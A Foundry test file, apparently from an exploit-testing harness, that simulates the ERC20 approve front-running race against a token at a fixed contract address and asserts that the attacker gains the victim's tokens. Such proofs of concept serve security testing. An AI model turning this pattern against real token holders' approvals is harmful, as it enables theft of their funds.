// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ITouch {
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    ITouch public token;
    address public victim = makeAddr("victim");

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ITouch(TARGET);

        // Fund the victim with tokens
        deal(TARGET, victim, 1000 * 1e18);

        // Ensure attacker starts with 0 tokens to measure profit
        deal(TARGET, attacker, 0);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        uint256 attackerInitialBalance = token.balanceOf(attacker);
                uint256 initialAllowance = 100 * 1e18;
                uint256 newAllowance = 50 * 1e18;

                // 1. Victim approves attacker for an initial amount
                vm.prank(victim);
                token.approve(attacker, initialAllowance);

                // 2. Attacker front-runs the victim's attempt to reset the allowance.
                // The attacker spends the initial allowance before the victim's txs are mined.
                token.transferFrom(victim, attacker, initialAllowance);

                // 3. Victim's transactions to change the allowance are now mined.
                vm.startPrank(victim);
                // First, setting to zero
                token.approve(attacker, 0);
                // Second, setting the new allowance
                token.approve(attacker, newAllowance);
                vm.stopPrank();

                // 4. Attacker spends the new allowance.
                token.transferFrom(victim, attacker, newAllowance);

                // 5. Check profit.
                uint256 attackerFinalBalance = token.balanceOf(attacker);
                assertGt(attackerFinalBalance, attackerInitialBalance);
                assertEq(attackerFinalBalance, initialAllowance + newAllowance);
        uint256 finalBalance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
